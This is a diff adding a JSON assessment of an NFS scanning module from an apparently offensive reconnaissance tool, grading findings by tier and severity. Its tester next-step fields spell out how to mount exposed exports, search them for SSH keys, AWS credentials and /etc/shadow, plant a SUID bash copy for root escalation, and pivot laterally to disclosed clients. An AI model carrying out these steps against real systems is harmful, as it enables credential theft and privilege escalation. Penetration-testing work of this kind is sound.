@@ -1,0 +1,74 @@
+{
+  "service": "nfs",
+  "module_files": [
+    "recce/services/nfs.py"
+  ],
+  "summary": "Strong module: portmapper DUMP + MOUNTPROC_EXPORT + MOUNTPROC_MNT (which returns a real root filehandle from recce's IP). MNT is T2-grade proof-of-mountability but the module stops short of AUTH_SYS UID spoofing or NFSv3 READDIR/GETATTR walk-through that would turn the filehandle into pulled data (T3).",
+  "findings": [
+    {
+      "kind": "nfs_world",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "NFS export shared to any host (world-mountable)",
+      "tier_evidence": "showmount -e groups=* is a deterministic vuln signal: the export ACL is objectively 'any host'. No exploit sent.",
+      "can_promote_to": "t3",
+      "promotion_notes": "After MOUNTPROC_MNT success, walk NFSv3 GETATTR/READDIR on the returned root filehandle and record file list (etc/shadow, id_rsa, .bash_history). That is T3 actual loot pull, not just proof.",
+      "promotion_risk": "low",
+      "tester_next_step": "mkdir -p /mnt/nfs && mount -t nfs -o vers=3,nolock IP:/<export> /mnt/nfs && ls -laR /mnt/nfs | head -200; look for id_rsa, .aws/credentials, /etc/shadow. If no_root_squash: cp /bin/bash /mnt/nfs/.bash && chmod +s /mnt/nfs/.bash for SUID escalation.",
+      "related_cves": []
+    },
+    {
+      "kind": "nfs_export",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "NFS exports enumerable without authentication",
+      "tier_evidence": "Directory-listing recon only; no exposure claim beyond information disclosure.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Already correct: showmount -e without creds is just enum.",
+      "promotion_risk": "none",
+      "tester_next_step": "showmount -e IP  # if any 'Everyone' or '*' rows appear, mount them per nfs_world guidance",
+      "related_cves": []
+    },
+    {
+      "kind": "nfs_rpc",
+      "tier": "t0",
+      "severity": "low",
+      "title_pattern": "RPC services enumerable via portmapper (rpcbind)",
+      "tier_evidence": "PMAPPROC_DUMP is fingerprint/recon.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Portmapper listing is not itself a vuln; keep at T0.",
+      "promotion_risk": "none",
+      "tester_next_step": "rpcinfo -p IP  # note nfs/mountd/nlockmgr; feed mountd port to showmount",
+      "related_cves": []
+    },
+    {
+      "kind": "nfs_mnt_open",
+      "tier": "t2",
+      "severity": "high",
+      "title_pattern": "NFS mountd granted a filehandle (mount succeeded from recce)",
+      "tier_evidence": "MOUNTPROC_MNT MNT3_OK returns a real 32-byte root filehandle to recce's own IP: this is a controlled probe that succeeds ONLY if the export is mountable by an attacker, and captures a genuine primitive (the filehandle). Non-destructive.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Send NFSv3 GETATTR/READDIRPLUS on the returned filehandle to prove data read; on no_root_squash, WRITE (LINK/CREATE) a SUID payload. Requires new nfs3 XDR client, but purely additive read-only walk is safe.",
+      "promotion_risk": "medium",
+      "tester_next_step": "mount -o vers=3,nolock,soft IP:/<export> /mnt/x; find /mnt/x -maxdepth 3 -name id_rsa -o -name authorized_keys -o -name shadow 2>/dev/null; stat /mnt/x/etc  # if uid 0 = root_squash off",
+      "related_cves": []
+    },
+    {
+      "kind": "nfs_mount_clients",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "NFS mountd disclosed the client mount list (showmount -a)",
+      "tier_evidence": "MOUNTPROC_DUMP client list is neighbour recon, not an exposure of the exports.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Feed the disclosed hostnames into known_hosts/relay_targets; module already claims this pattern.",
+      "promotion_risk": "none",
+      "tester_next_step": "showmount -a IP  # each 'client:/export' pair is a lateral pivot target \u2014 resolve hosts and rescan those subnets",
+      "related_cves": []
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_hosts",
+    "known_hostnames",
+    "relay_targets"
+  ]
+}
